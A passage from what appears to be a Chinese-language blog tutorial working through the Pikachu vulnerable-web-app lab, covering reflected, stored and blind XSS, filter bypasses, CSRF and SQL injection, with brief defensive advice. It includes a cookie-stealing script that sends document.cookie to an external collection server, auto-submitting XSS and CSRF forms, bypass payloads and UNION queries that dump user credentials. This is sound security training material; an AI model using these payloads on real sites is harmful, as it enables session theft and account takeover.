+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">&#x27;http://47.110.82.83:33333/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="built_in">document</span>.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>点击提交</strong></p>
+<p>然后访问xss后台Cookie搜集模块</p>
+<p><img src="https://i.loli.net/2020/11/18/CSgMVni5ha8fErB.png"></p>
+<p>这里已经有了我们想要的数据。</p>
+<blockquote>
+<p>Get反射型型xss只需将恶意js插入到Url中，然后将其进行URL编码后发送出去，那么就可以达到恶意攻击的目的。</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><h2 id="反射型XSS（Post）"><a href="#反射型XSS（Post）" class="headerlink" title="反射型XSS（Post）"></a>反射型XSS（Post）</h2><blockquote>
+<p>这里要先登陆一下，admin/123456</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/19/t7dLaghkbA6DSE4.png"></p>
+<p>下面是一个朴实无华的提交框，在里面写上js代码</p>
+<p><img src="https://i.loli.net/2020/11/19/1oQdhRZOmWV7D5I.png"></p>
+<p><img src="https://i.loli.net/2020/11/19/2V1bsYoc37Aaeq4.png"></p>
+<p>点击提交！</p>
+<p><img src="https://i.loli.net/2020/11/19/ykGZJpi7AsrgVCo.png"></p>
+<blockquote>
+<p> 成功弹窗，这里看起来和Get型的xss是一样的，其实仔细观察，写的js代码并没有在URL中显示，那么该怎么利用？往下看！</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><h2 id="反射型XSS利用（Post型获取Cookie）"><a href="#反射型XSS利用（Post型获取Cookie）" class="headerlink" title="反射型XSS利用（Post型获取Cookie）"></a>反射型XSS利用（Post型获取Cookie）</h2></li>
+</ul>
+<blockquote>
+<p>下面来看利用Post反射型xss获取Cookie</p>
+</blockquote>
+<p>还是得先登陆，形成cookie</p>
+<p><img src="https://i.loli.net/2020/11/19/t7dLaghkbA6DSE4.png"></p>
+<p>接下来需要构造一个恶意表单给用户点击</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//自动提交</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--action提交到带有反射型xss的页面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://47.110.82.83:33333/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--内置好的js恶意代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;xssr_in&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=</span></span><br><span class="line">    &quot;&lt;script&gt;</span><br><span class="line">document.location = &#x27;http://47.110.82.83:33333/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;</span><br><span class="line">	 /&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里是制作一个已经恶意表单，当用户点击到这个页面时，将会自动提交表单盗取用户的Cookie信息，这时候来看xss后台，是否已经有了信息</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/19/qsOYilaPr3GfKb2.png"></p>
+<blockquote>
+<p>这里面包含了用户的ip，cookie，浏览器等信息，同时cookie中包含了账号密码等敏感信息。</p>
+</blockquote>
+<ul>
+<li><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型xss的漏洞危害等级很高，因为攻击者的js代码将会永久的存储到数据库当中，只要有人访问到带有存储型的xss页面当中都会触发漏洞，从而造成用户信息泄露等危害。</p>
+<p>一般存储型xss漏洞存在与留言板、评论等与网站交互处。</p>
+<blockquote>
+<p>打开pikachu的存储型xss</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/19/muicvDXlRMQ57dK.png"></p>
+<p>在里面随便输点内容看一下</p>
+<p><img src="https://i.loli.net/2020/11/19/UV4bvwp5W8cyZOH.png"></p>
+<p>看起来没什么问题</p>
+<p>构造js代码</p>
+<p><img src="https://i.loli.net/2020/11/19/xRJeWdZBo9yQm3V.png"></p>
+</li>
+</ul>
+<p>点击提交</p>
+<p><img src="https://i.loli.net/2020/11/19/1gOnE5XuAwWxtR8.png"></p>
+<blockquote>
+<p>之后每次访问这个页面都将会触发这个js弹窗</p>
+</blockquote>
+<ul>
+<li><h2 id="DOM型XSS利用（钓鱼）"><a href="#DOM型XSS利用（钓鱼）" class="headerlink" title="DOM型XSS利用（钓鱼）"></a>DOM型XSS利用（钓鱼）</h2><p>这里利用Basic认证作为一个钓鱼的场景</p>
+<p>在这个存在存储型xss的页面内嵌一个钓鱼链接或者请求</p>
+<blockquote>
+<p>首先这里推一个开放的xss平台<a target="_blank" rel="noopener" href="https://xs.sb/">https://xs.sb</a></p>
+</blockquote>
+<p>注册登陆后在我的项目里点击创建</p>
+<p><img src="https://i.loli.net/2020/11/19/UTjGNcohKHge57q.png"></p>
+<p>下面设置项目名称并选中基础钓鱼选项</p>
+<p><img src="https://i.loli.net/2020/11/19/n4tWdvCzk9ZY8Ij.png"></p>
+<p>创建好后将里面提供的代码填入pikachu的留言框中</p>
+<p><img src="https://i.loli.net/2020/11/19/N9g5s2HWITJpdnt.png"></p>
+<p>这个时候触发Basic认证，当用户毫无警觉的将自己的用户名密码输入并提交后，在xss后台就可以收到用户所填写的敏感内容。</p>
+<p><img src="https://i.loli.net/2020/11/19/Eut5yO3Pe8M1Zmj.png"></p>
+</li>
+</ul>
+<ul>
+<li><h2 id="存储型XSS利用（键盘记录读取）"><a href="#存储型XSS利用（键盘记录读取）" class="headerlink" title="存储型XSS利用（键盘记录读取）"></a>存储型XSS利用（键盘记录读取）</h2><p>这里我们利用存储型xss来获取用户的键盘输入</p>
+<p>打开xss平台创建一个键盘获取的项目</p>
+<p>然后将代码插入存在存储型xss的地方</p>
+<p><img src="https://i.loli.net/2020/11/19/4Tq8lhkKXGIVxtL.png"></p>
+<p>F12打开网络，然后在键盘上输入字符，可以看到有数据请求xsshs.cn</p>
+<p>打开xss平台进入键盘记录项目</p>
+<p><img src="https://i.loli.net/2020/11/19/SPuNg9sZ7cRCw5z.png"></p>
+<p>数据成功上传到了这里</p>
+</li>
+</ul>
+<ul>
+<li><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><blockquote>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>​    1、盲打其实只是一种习惯性的说法，就是在不知道后台有没有xss存在的情况下，不顾一切的输入xss代码在留言处，这个留言不在用户前端显示，而是在管理员页面显示。</p>
+<p>​    2、xss盲打是指在攻击者对数据提交后展现的后台未知情况下，网站采用了攻击者插入带真实攻击功能的xss攻击代码（通常是使用js标签引入远程的js）。当未知后台在展现时没有对这些提交的额数据进行过滤，那么后台管理人员在操作时就会触发xss攻击。</p>
+</blockquote>
+<p>下面来看操作</p>
+<p><img src="https://i.loli.net/2020/11/19/gwAXndNoHFGQ5Du.png"></p>
+<p>这里来随便输入一点东西来看一下！</p>
+<p><img src="https://i.loli.net/2020/11/19/XA9hOia8Heuvryq.png"></p>
+<p>前端没有任何的显示，但是看提示说明后台已经收到了提交的内容，去后台看一下</p>
+<p><img src="https://i.loli.net/2020/11/19/IFrtefnSY4MXdvP.png"></p>
+<p>后台成功受到了前端提交的信息，在前端构造js语句</p>
+<p><img src="https://i.loli.net/2020/11/19/XVqFGS5tOwMbnmj.png"></p>
+<p>点击提交，然后再次访问后台</p>
+<p><img src="https://i.loli.net/2020/11/19/Z4e1EuBnQFXxjG8.png"></p>
+<p><img src="https://i.loli.net/2020/11/19/3cWkAtZ927bLKsJ.png"></p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2020/11/19/PqWxBfMu5kemR8j.png"></p>
+<blockquote>
+<p>成功触发！</p>
+</blockquote>
+<ul>
+<li><h2 id="XSS绕过-过滤-转换"><a href="#XSS绕过-过滤-转换" class="headerlink" title="XSS绕过-过滤-转换"></a>XSS绕过-过滤-转换</h2></li>
+</ul>
+<blockquote>
+<p>由于前端的某些限制会导致我们的xss无法成功的执行，下面讲解一些关于xss绕过的姿势！</p>
+<p>1、前端限制绕过，直接抓白重放或者修改html前端代码</p>
+<p>2、大小写绕过，比如</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;aLeRT(<span class="number">123</span>)&lt;/sCRIpt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、拼凑绕过：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;alert(<span class="number">123</span>)&lt;<span class="regexp">/scri&lt;/</span>script&gt;&gt;pt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>4、使用注释进行干扰绕过：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;!--aaa--&gt;pt&gt;alert(<span class="number">123</span>)&lt;/scri&lt;!--bbb--&gt;pt&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里看到xss的过滤放在前端形同虚设。尽量放在后端来执行，使系统更加相对完全。</p>
+<ul>
+<li><h2 id="XSS绕过-过滤-编码"><a href="#XSS绕过-过滤-编码" class="headerlink" title="XSS绕过-过滤-编码"></a>XSS绕过-过滤-编码</h2><blockquote>
+<p>核心思路：</p>
+<p>后台过滤了特殊字符，比如script标签，但该标签可以被各种编码，后台不一定会过滤。当浏览器对该编码进行识别使，会翻译成正常的标签从而执行。</p>
+</blockquote>
+<p><strong>注意点：</strong></p>
+<p>​    在使用编码使需要注意编码在输出点是否会被正常识别和翻译。（在保证后台无法识别的情况下得保证在前端输出点能被前端所翻译）</p>
+</li>
+</ul>
+<ul>
+<li><p>XSS绕过实战</p>
+<p>打开Pikachu平台–&gt;xss过滤</p>
+<p><img src="https://i.loli.net/2020/11/28/FhIuRKdDx78sYAU.png"></p>
+<p>先正常输入一段xss代码</p>
+<p><img src="https://i.loli.net/2020/11/28/WNUfI6pVOE9vFxK.png"></p>
+<p>F12查看源码</p>
+<p><img src="https://i.loli.net/2020/11/28/zOBTpcklvr6qdIR.png"></p>
+<p>script标签直接被干掉了，接下来尝试绕过</p>
+</li>
+</ul>
+<p>  <img src="https://i.loli.net/2020/11/28/Vtg7ZjvHk5cQiGh.png"></p>
+<p>  大小写尝试绕过</p>
+<p>  <img src="https://i.loli.net/2020/11/28/Pobw6ZzXKrBY7LT.png"></p>
+<p>  成功弹窗！F12查看源码</p>
+<p>  <img src="https://i.loli.net/2020/11/28/qdrmZNShE19jAFL.png"></p>
+<ul>
+<li><h2 id="XSS绕过-关于htmlspecialchars-函数"><a href="#XSS绕过-关于htmlspecialchars-函数" class="headerlink" title="XSS绕过-关于htmlspecialchars()函数"></a>XSS绕过-关于htmlspecialchars()函数</h2><p>htmlspecialchars()函数把预定义的字符转换为HTML实体。</p>
+<p>预定义的字符是：</p>
+<p>&amp;（和号）成为&amp;amp</p>
+<p>“ (双引号)成为&amp;quot</p>
+<p>‘ (单引号)成为&amp;#039</p>
+<p>&lt; (小于号) 成为&amp;It</p>
+<p>大于号成为&amp;gt</p>
+<blockquote>
+<p>接下来开始测试</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/28/uSO6dc2kxiWLNDf.png"></p>
+<p>随便输入点进去测试</p>
+<p>点击提交并查看源码</p>
+<p><img src="https://i.loli.net/2020/11/28/tiLU7u96yMevZf2.png"></p>
+<p>这里看到除了单引号其余的符号都被过滤</p>
+<p>开始构造payload绕过</p>
+<p><img src="https://i.loli.net/2020/11/28/ltPR3MwgmhcYsou.png"></p>
+<p>点击提交</p>
+<p><img src="https://i.loli.net/2020/11/28/1DuwafZMtKWo3E5.png"></p>
+<p>点击</p>
+<p><img src="https://i.loli.net/2020/11/28/v3SAodq5FWK6xZL.png"></p>
+<p>成功弹窗，F12查看源码</p>
+<p><img src="https://i.loli.net/2020/11/28/qcKb3Jf8oAEOyNU.png"></p>
+</li>
+</ul>
+<ul>
+<li><h2 id="XSS常见防范措施（XSS之href和JS输出）"><a href="#XSS常见防范措施（XSS之href和JS输出）" class="headerlink" title="XSS常见防范措施（XSS之href和JS输出）"></a>XSS常见防范措施（XSS之href和JS输出）</h2><blockquote>
+<p>总的原则：输入做过滤，输出做转移</p>
+<p>过滤：根据需求进行过滤，例如某点仅允许输入手机号，则只允许输入手机号格式的数字</p>
+<p>转移：所有输出到前端的数据都根据输出点进行转义。例如输出到html中进行html转义，输入到js里的进行js转移</p>
+</blockquote>
+<p>下面来看测试<strong>XSS之href输出</strong></p>
+<p><img src="https://i.loli.net/2020/11/28/xh7Ne82kAGtc3Cl.png"></p>
+<p>输入123456看一下</p>
+<p><img src="https://i.loli.net/2020/11/28/8WE7IwitHOmfBRC.png"></p>
+<p>F12查看源码</p>
+<p><img src="https://i.loli.net/2020/11/28/B4Ahf9gFyedZcaP.png"></p>
+<p>构造payload</p>
+<p><img src="https://i.loli.net/2020/11/28/xLXDCzjVJ72K8Ih.png"></p>
+<p>点击提交</p>
+<p><img src="https://i.loli.net/2020/11/28/4capCLPo1AqUebj.png"></p>
+<p>成功弹窗</p>
+<p>F12查看源码</p>
+<p><img src="https://i.loli.net/2020/11/28/OKkH582GmMvluX4.png"></p>
+<p><strong>XSS之JS输出：</strong></p>
+<p><img src="https://i.loli.net/2020/11/28/Q5TXk8Hp7xsSGiD.png"></p>
+<p>点击提交查看源码</p>
+<p><img src="https://i.loli.net/2020/11/28/QPe9MJiAFar1cEk.png"></p>
+<p>通过查找功能搜索fromjs查看js源码并将其复制到记事本</p>
+<p><img src="https://i.loli.net/2020/11/28/fuSmBzlHW3g8IVJ.png"></p>
+<p>这里开始构造payload</p>
+<p><img src="https://i.loli.net/2020/11/28/przZxHUnOdtbGKT.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123456</span><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/11/28/qCOzGuZF5rH3WbP.png"></p>
+<p>成功弹窗！</p>
+</li>
+</ul>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ul>
+<li><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>1、Cross-site request forgery简称为<strong>CSRF</strong></p>
+<blockquote>
+<p>在CSRF欺骗的场景中攻击者会伪造一个请求（一般为一个链接）</p>
+<p>然后欺骗用户点击，用户一旦议案及了这个请求，整个攻击也就完成了</p>
+<p>所以CSRF攻击也称为“one click”攻击。</p>
+</blockquote>
+<p>2、CSRF漏洞与XSS的区别</p>
+<pre><code>&gt;CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取了用户的权限，然后实施攻击。</code></pre>
+<p>3、如何确认一个web系统存在CSRF漏洞</p>
+<blockquote>
+<p>a、对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p>
+<p>—比如修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造</p>
+<p>—比如对敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造</p>
+<p>b、确认凭证的有效期（会提高csrf被利用的概率）</p>
+<p>—比如虽然退出了或关闭了浏览器，但cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变简单。</p>
+</blockquote>
+</li>
+<li><h2 id="CSRF（Get型）"><a href="#CSRF（Get型）" class="headerlink" title="CSRF（Get型）"></a>CSRF（Get型）</h2></li>
+</ul>
+<blockquote>
+<p>首先这里先以lucy登陆并修改其信息</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/Tyu3Sjh6V7zHsiL.png"></p>
+<blockquote>
+<p>这里是已经修改好了的信息，通过抓包在url中找到了修改信息</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/uhsbHJqad5iKgrR.png"></p>
+<blockquote>
+<p>下面开始模拟攻击，构造好要修改的信息的url</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/IHfAhNV1nq8MtEG.png"></p>
+<blockquote>
+<p>在主机中打开此关登陆lili的账号</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/C3OlPRAmzSh8H6L.png"></p>
+<blockquote>
+<p>下面模拟lili点击了构造好了的恶意链接</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/FWrwjGQLVsH2bmf.png"></p>
+<blockquote>
+<p>成功完成攻击并修改了lili的信息</p>
+</blockquote>
+<ul>
+<li><h2 id="CSRF-POST型"><a href="#CSRF-POST型" class="headerlink" title="CSRF(POST型)"></a>CSRF(POST型)</h2></li>
+</ul>
+<p>先抓包</p>
+<p><img src="https://i.loli.net/2020/12/07/XIWnOGA2rkKgH1p.png"></p>
+<blockquote>
+<p>这里看到信息以post型传递</p>
+</blockquote>
+<p>下面开始利用，首先制作一个恶意页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//自动提交</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://47.110.82.83:33333/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--内置好的js恶意代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;CSRF&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span></span></span><br><span class="line"><span class="tag">	 /&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;CSRF&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span></span></span><br><span class="line"><span class="tag">	 /&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;CSRF&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;shanghai&quot;</span></span></span><br><span class="line"><span class="tag">	 /&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;CSRF&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666@qq.com&quot;</span></span></span><br><span class="line"><span class="tag">	 /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>接下来登陆allen的账号，模拟攻击</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/QRrqydChgKwOF13.png"></p>
+<blockquote>
+<p>将恶意页面放置服务器上，将恶意链接引诱Allen点击</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/TON2JKpItEbklmo.png"></p>
+<blockquote>
+<p>成功修改allen信息</p>
+</blockquote>
+<ul>
+<li><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2></li>
+</ul>
+<blockquote>
+<p>先抓包</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/07/BbqSgxZATHlY4zP.png"></p>
+<p>头部有个token值，无法利用</p>
+<ul>
+<li><h2 id="Token如何防止CSRF"><a href="#Token如何防止CSRF" class="headerlink" title="Token如何防止CSRF"></a>Token如何防止CSRF</h2><blockquote>
+<p><strong>增加token验证（常用的方法）</strong></p>
+<p>1、对关键操作增加token参数，token值必须随机，每次都不一样</p>
+<p><strong>关于安全的会话管理（避免会话被利用）</strong></p>
+<p>1、不要再客户端保存敏感信息（比如身份认证信息）</p>
+<p>2、测试直接关闭，退出时，会话的过期机制</p>
+<p>3、设置会话过期机制，比如15分钟内误操作自动登出</p>
+<p><strong>访问控制安全管理</strong></p>
+<p>1、敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码</p>
+<p>2、敏感信息的修改使用post，而不是get</p>
+<p>3、通过http头部中的referer来限制原页面</p>
+<p><strong>增加验证码</strong></p>
+<p>一般用在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="SQL注入（sql-inject）"><a href="#SQL注入（sql-inject）" class="headerlink" title="SQL注入（sql-inject）"></a>SQL注入（sql-inject）</h1><ul>
+<li><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p>数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击者可以通过合法的输入提交一些精心构造的语句，从而七篇数据库对其进行执行，导致数据库信息泄露的一种漏洞。</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2></li>
+</ul>
+<blockquote>
+<p>第一步：</p>
+<p>​    自动方式：使用web漏洞扫描工具，自动进行注入点发现</p>
+<p>​    手动方式：手工构造sql注入测试语句进行注入点发现</p>
+<p>第二步：</p>
+<p>​    通过注入点取期望值得到的数据</p>
+<p>​    1、环境信息：数据库类型，数据库版本，操作系统版本，用户信息等。</p>
+<p>​    2、数据库信息：数据库名称、表、字段、字段内容。</p>
+<p>第三步：</p>
+<p>​    获取操作系统权限：通过数据库执行shell，上传木马。</p>
+</blockquote>
+<ul>
+<li><h2 id="注入点类型"><a href="#注入点类型" class="headerlink" title="注入点类型"></a>注入点类型</h2></li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数字型：user_id=$id</span><br><span class="line"></span><br><span class="line">字符型：user_id=&#x27;$id&#x27;</span><br><span class="line"></span><br><span class="line">搜索型：text LIKE &#x27;%&#123;$_GET[&#x27;search&#x27;]&#125;%&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="数字型注入（Post）"><a href="#数字型注入（Post）" class="headerlink" title="数字型注入（Post）"></a>数字型注入（Post）</h2></li>
+</ul>
+<p><img src="https://i.loli.net/2020/12/08/NdIMBZb5jFc3q4l.png"></p>
+<p>选择1进行抓包然后进行重放（Repeater）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">id = 1 or 1=1 <span class="comment">#</span></span><br><span class="line">//发现遍历</span><br><span class="line">id = 1 order by 5<span class="comment">#</span></span><br><span class="line">//判断字段，5会报错，采用二分法</span><br><span class="line">id = 1 order by 2<span class="comment">#</span></span><br><span class="line">//正确回显</span><br><span class="line">id = 1 union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">#</span></span><br><span class="line">//查看数据库名称，数据库版本</span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()<span class="comment">#</span></span><br><span class="line">//查看表名,爆出httpinfo，<span class="keyword">member</span>，message，<span class="keyword">users</span>，xssblind</span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()  <span class="keyword">and</span> table_name = <span class="string">&#x27;users&#x27;</span><span class="comment">#</span></span><br><span class="line">//查看列名,爆出列名<span class="keyword">id</span>，username，<span class="keyword">password</span>，<span class="keyword">level</span></span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br><span class="line">//成功爆出用户名<span class="keyword">admin</span>，Pikachu，<span class="keyword">test</span>以及<span class="keyword">MD5</span>加密的密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="字符型注入（Get）"><a href="#字符型注入（Get）" class="headerlink" title="字符型注入（Get）"></a>字符型注入（Get）</h2><p><strong><em>此处注入语句与上方相同</em></strong></p>
+<p><img src="https://i.loli.net/2021/01/15/z9JrSegpF6Vl2ka.png"></p>
+</li>
+<li><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>通过测试，猜测此处php语句应为：</p>
